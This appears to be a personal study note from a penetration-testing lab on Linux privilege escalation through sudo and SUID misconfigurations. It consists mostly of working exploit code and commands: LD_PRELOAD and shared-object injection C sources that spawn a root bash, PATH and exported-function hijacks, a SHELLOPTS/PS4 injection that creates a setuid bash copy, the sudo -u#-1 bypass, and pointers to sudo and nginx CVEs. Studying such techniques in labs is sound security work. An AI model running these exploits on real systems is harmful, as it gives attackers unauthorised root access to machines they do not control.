---
title: SUDO / SUID
updated: 2023-11-03 11:18:34Z
created: 2023-10-14 12:46:52Z
latitude: -33.86881970
longitude: 151.20929550
altitude: 0.0000
---

### SUDO (shell escaping)

1.  `sudo -l`  
    GTFOBins for exploit
2.  If sudo command is unique (like being able to do vim or look at man pages, try doing a bash escape by typing `!/bin/bash`

### SUDO (pwfeedback)

1.  `sudo -V`  
    If version is **< 1.8.26** , **[CVE-2019-18634](https://github.com/saleemrashid/sudo-cve-2019-18634)**  
    OR
2.  `sudo <any command>`  
    Check if \* are being displayed when you type password

### SUDO LD\_PRELOAD

1.  Open a text editor and type:

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

2.  Save the file as **x.c**
3.  In command prompt type:  
    `gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles`
4.  In command prompt type:  
    `sudo LD_PRELOAD=/tmp/x.so apache2`

### SUDO !root /bin/bash

1.  `sudo -u#-1 /bin/bash`  
    Check any results in GTFOBins for SUID

* * *

## SUID

1.  `find / -perm -u=s -type f 2>/dev/null`
    
2.  `find / -type f -perm -04000 -ls 2>/dev/null | grep suid`  
    Look for binaries with s permission eg. \-rw**s**r-xr-x
    
3.  Look for any strings in the binaries  
	`strings /path/to/binary | tac`
	
For **/usr/local/bin/suid-so** - Follow Exploit **SUID Shared Object Injection**  
For **/usr/local/bin/suid-env** - Follow Exploit **SUID Environment Variables #1**

### SUID (Shared Object Injection)

3.  `strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"`  
    Notice the file location where it reports no such file, and we can replace the missing file with malicious payload

**Exploit**:

1.  `mkdir /home/<user>/.config`
2.  `vi /home/<user>/.config/libcalc.c`

```
#include <stdio.h>
#include <stdlib.h>
static void inject() __attribute__((constructor));
void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

3.  Save the file as **libcalc.c**
4.  In command prompt type:  
    `gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c`  
    Re-run command:
5.  `/usr/local/bin/suid-so`

### SUID (Environment Variables #1)

1.  `strings /usr/local/bin/suid-env`
2.  From the output, notice the functions used by the binary.
3.  If function is "**service**" (**eg. service apache2 start**)
4.  Create **service.c** file  
    `echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c`
5.  `gcc /tmp/service.c -o /tmp/service`
6.  `export PATH=/tmp:$PATH`
7.  Execute: `/usr/local/bin/suid-env`

### SUID (Environment Variables #2)

1.  `strings /usr/local/bin/suid-env2`

Option1:

1.  If function is **/usr/bin/service** (**eg /usr/bin/service apache2 start**)
2.  `function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }`
3.  `export -f /usr/sbin/service`
4.  Execute: `/usr/local/bin/suid-env2`

Option2:

1.  If function is **/usr/bin/service** (**eg /usr/bin/service apache2 start**)
2.  `env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'`

### SUID (Symlinks)

1.  `dpkg -l`  
    Look for vulnerable packages(like nginx - CVE-2016-1247)